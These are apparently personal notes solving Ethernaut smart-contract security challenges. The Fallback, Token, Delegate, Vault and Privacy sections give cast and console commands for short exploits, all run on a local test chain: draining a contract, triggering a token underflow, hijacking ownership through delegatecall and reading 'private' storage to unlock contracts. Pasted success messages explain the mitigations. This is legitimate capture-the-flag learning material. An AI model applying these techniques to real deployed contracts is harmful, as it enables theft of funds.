# notes

## Fallback:

1. `cast send <CONTRACT-ADDRESS> "contribute()" --value 0.001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
2. `cast send <CONTRACT-ADDRESS> --value 0.0001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
3. `cast send <CONTRACT-ADDRESS> "withdraw()" --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`

## Token:

paste this line in command:
```js
await contract.transfer(contract.address, 500)
```
this will cause underflow `2^256 - 480 = 115792089237316195423570985008687907853269984665640564039457584007913129639456`.

### success message:

```txt
Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.
```

## Delegate:

paste this line command:

```js
await contract.sendTransaction({data:web3.eth.abi.encodeFunctionSignature("pwn()")})
```

or use [this script](../script/DelegateAttacker.s.sol)

### success message:

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The [Parity Wallet Hack](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) Explained article for an accurate explanation of how this idea was used to steal 30M USD.

## Vault:
- get contract's address using `contract.address`. I've got `0x06B1D212B8da92b83AF328De5eef4E211Da02097`.
- If you run `await contract.locked()` you'll get true.
- password is in storage position 1. so read it using:

```bash
cast storage 0x06B1D212B8da92b83AF328De5eef4E211Da02097 1
>> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

-  now call the `unlock(bytes32)` function using cast:
   
```bash
cast send 0x06B1D212B8da92b83AF328De5eef4E211Da02097 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```
- **wait a few sec like 10-15 seconds** & now if you run `await contract.locked()` in console, you'll get `false`.

### success message:

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

## King:

### Links:
- [About King](https://www.kingoftheether.com/thrones/kingoftheether/index.html)
- [King Postmortem](https://www.kingoftheether.com/postmortem.html)

## Reentrancy:

I refered this [blog](https://www.cyfrin.io/glossary/sending-ether-transfer-send-call-solidity-code-example)

### success message:

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that call will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.io/blog/2019/09/stop-using-soliditys-transfer-now/), [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

**The DAO Hack**

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. [See 15 lines of code that could have prevented TheDAO Hack.](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942)


## Privacy

The contract is storing secret data in **contract's storage** like below:

```
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;
```

now the contract's storage slot looks like:

```
#0 => bool locked
#1 => uint256 ID
#2 => uint8 flattening + uint8 denomination + uint16 awkardness
#3 => bytes32 data[0]
#4 => bytes32 data[1]
#5 => bytes32 data[2]
```

- get the `bytes32 data[2]` from **storage slot #5** using `cast storage <CONTRACT-ADDRESS> 5`
- take the first **16-bytes** and attach `0x` infront of it and send it the contract
- `cast send <CONTRACT-ADDRESS> "unlock(bytes16)" 768154e92adb5f1901c74c0fbb0faadd --rpc-url http://localhost:8545 --private-key <PRIVATE-KEY>`
- now check the **storage slot #0** if it is 0. the level is done

## Denial
**Success Message:**
```txt
This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <Address>.call{gas: <gasAmount>}(data). Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
```

## DEX 1:
**Success Message:**
```
The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.

Oracles are used to get data into and out of smart contracts.

Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintenance, and unlimited customization.

Uniswap TWAP Oracles relies on a time weighted price model called TWAP. While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting the price of Bitcoin in USD from a Chainlink data feed (on the Sepolia testnet):

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {
    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Sepolia
     * Aggregator: BTC/USD
     * Address: 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
     */
    constructor() {
        priceFeed = AggregatorV3Interface(
            0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
        );
    }

    /**
     * Returns the latest price.
     */
    function getLatestPrice() public view returns (int) {
        // prettier-ignore
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }
}

Check the Chainlink feed page to see that the price of Bitcoin is queried from up to 31 different sources.

You can check also, the list all Chainlink price feeds addresses.
```

## DEX 2:

**Success message:**
```text
As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.
```

refer => [Missing return value bug - At least 130 tokens affected by Lukas Cremer. A Medium blog](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca)


## Puzzle Wallet

**Success message:**
```text
Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.

Move on to the next level when you're ready!

```

## DoubleEntryPoint

### Success Message:
```text
Congratulations!

This is the first experience you have with a Forta bot.

Forta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action.

The presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot's alert effectively trigger a revert in the transaction, deviating from the intended Forta's bot design.

Detection bots heavily depends on contract's final implementations and some might be upgradeable and break bot's integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it here.

You have also passed through a recent security issue that has been uncovered during OpenZeppelin's latest collaboration with Compound protocol.

Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened here.
```

**Provided links in the message:**
- https://docs.forta.network/en/latest/
- https://www.tally.xyz/gov/compound/proposal/76
- https://www.openzeppelin.com/news/compound-tusd-integration-issue-retrospective

## GoodSamaritan

### Success Message:
```text
Congratulations!

Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan's requestDonation() function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.
```